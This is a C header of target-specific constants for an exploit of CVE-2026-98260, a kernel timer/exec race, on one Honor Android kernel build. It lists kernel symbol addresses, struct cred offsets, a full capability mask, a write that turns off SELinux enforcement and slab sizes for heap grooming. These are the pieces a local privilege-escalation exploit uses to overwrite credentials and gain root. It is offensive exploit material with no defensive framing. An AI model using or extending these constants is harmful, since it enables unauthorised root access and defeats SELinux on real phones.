/* pc98260_target_g52d15.h — CVE-2026-98260 per-build constants.
 *
 * Target: 6.12.81-android16-6-g52d15df5db87-abogki576042287-4k
 *   (Honor Magic9 MLY-AN00 full OTA 2026-11 boot.img; kernel extracted from
 *   PayloadDumper boot.img, plain ARM64 Image, 4K pages)
 *
 * Derived: kallsyms + BTF + manual disassembly verification.
 *   - LINK_ALLOC_TIMER is the kmem_cache_alloc_noprof return site inside
 *     alloc_posix_timer (0xffffffc0802c3aa0+0x28).  This build no longer
 *     inlines alloc_posix_timer into do_timer_create (6.12.58-era builds
 *     did); do_timer_create merely BLs to it at +0x80.
 *   - LINK_ALLOC_CRED is prepare_creds+0x2c (bl kmem_cache_alloc_noprof at
 *     prepare_creds+0x28, GFP 0xcc0, cred_jar).
 *   - alloc_posix_timer's second kmem_cache_alloc site (+0x9c) is not
 *     reachable from any branch in the image (verified by whole-image
 *     B/BL/CBZ/TBZ/B.cond/ADR/ADRP/literal scan); the fast-path site is the
 *     one the trace records for every timer_create.
 *
 * Status: STATIC adaptation only — no device has run this build yet.
 * Vulnerability check: fix acb03d388181 ("exec: Cleanup POSIX timers right
 * after de_thread()") is NOT in this build; begin_new_exec still calls
 * posix_cpu_timers_exit after exec_task_namespaces (BNE_TIMERS_EXIT_OFF
 * below).  The 64560 fix (920f893f735e, timer_lock_sighand) IS backported
 * in this build, so only the 98260 route applies.
 */
#ifndef PC98260_TARGET_G52D15_H
#define PC98260_TARGET_G52D15_H

#include <stdint.h>

#define TARGET_NAME          "honor-g52d15-static"
#define TARGET_KERNEL        "6.12.81-android16-6-g52d15df5db87-abogki576042287-4k"

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc08292ebc8)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc0826a2110)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc0826a2388)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc0826a3850)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc0826a3d20)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites (function-internal; NOT portable) --- */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc0802c3ac8)  /* alloc_posix_timer+0x28 */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc08012a514)  /* prepare_creds+0x2c     */

/* ---- struct geometry (6.12.81 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x900   /* task_struct.cred          */
#define GEO_TASK_REAL_CRED   0x8f8   /* task_struct.real_cred     */
#define GEO_KITIMER_IT       0x78    /* k_itimer.it (cpu_timer.node) */
#define GEO_KITIMER_SIZE     0x100   /* sizeof(k_itimer)          */
#define GEO_KITIMER_STRIDE   0x100   /* kmem_cache stride         */
#define GEO_CRED_SIZE        184     /* sizeof(struct cred)       */
#define GEO_CRED_ALLOC_SIZE  192     /* cred_jar cache object size (bytes_alloc) */
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_SECUREBITS  0x28
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_JIT_KEYRING  0x58
#define GEO_CRED_SESSION_KEYRING 0x60
#define GEO_CRED_PROCESS_KEYRING 0x68
#define GEO_CRED_THREAD_KEYRING  0x70
#define GEO_CRED_REQUEST_KEY_AUTH 0x78
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_CRED_UCOUNTS     0x98
#define GEO_CRED_GROUP_INFO  0xa0
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)   /* clear 7 bytes + enforcing */
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry (live /proc/slabinfo) ----------------------------
 * Seeds from the verified 6.12.58 (g142) slab layout; the plant re-reads
 * /proc/slabinfo at runtime and overrides them, so a stale seed fails
 * safe.  Confirm on a real device. */
#define GEO_TASK_OBJSIZE            5696  /* task_struct cache object */
#define GEO_TASK_OBJ_PER_SLAB       5
#define GEO_TASK_SLAB_PAGES         8
#define GEO_POSIX_TIMER_OBJSIZE     256
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 32
#define GEO_POSIX_TIMER_SLAB_ORDER  1     /* 2 pages = 8192 bytes */
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192  /* posix_timers_cache slab */

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000) /* inferred; on-device check pending */
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc081a0d8c0) /* memstart_addr symbol */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff) /* cap_last_cap=40 */

/* ---- begin_new_exec cleanup offsets (vulnerability check) -----------
 * begin_new_exec = 0xffffffc0803b9a10.  The 98260 window is intact:
 * posix_cpu_timers_exit runs AFTER exec_task_namespaces (and after the
 * exec_mmap failure points), and de_thread() does not clean timers. */
#define BNE_LINK              UINT64_C(0xffffffc0803b9a10)
#define BNE_DOWN_READ_OFF     0x130  /* exec_mmap down_read_killable */
#define BNE_TIMERS_EXIT_OFF   0x25c  /* posix_cpu_timers_exit */
#define BNE_EXIT_ITIMERS_OFF  0x26c  /* exit_itimers */

#endif /* PC98260_TARGET_G52D15_H */
